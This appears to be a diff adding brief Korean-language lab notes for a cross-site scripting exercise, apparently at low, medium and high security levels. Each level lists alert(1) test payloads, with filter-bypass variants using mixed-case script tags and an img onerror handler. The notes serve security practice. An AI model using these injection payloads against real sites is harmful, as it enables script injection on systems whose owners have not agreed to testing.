@@ -1,0 +1,26 @@
+low
+1. 이름 입력
+
+2. 스크립트 입력
+<script>alert(1)</script>
+
+
+medium
+1. 이름 입력
+
+2. 스크립트 입력
+<script>alert(1)</script>
+
+3. 스크립트 대소문자 혼합
+<scRIpt>alert(1)</sCriPt>
+
+
+high
+1. 이름 입력
+
+2. 스크립트 입력 & 대소문자 혼합
+<script>alert(1)</script>
+<scRIpt>alert(1)</sCriPt>
+
+3. 다른 태그 사용
+<img src=asd.png onerror="alert(1)">asd</img>
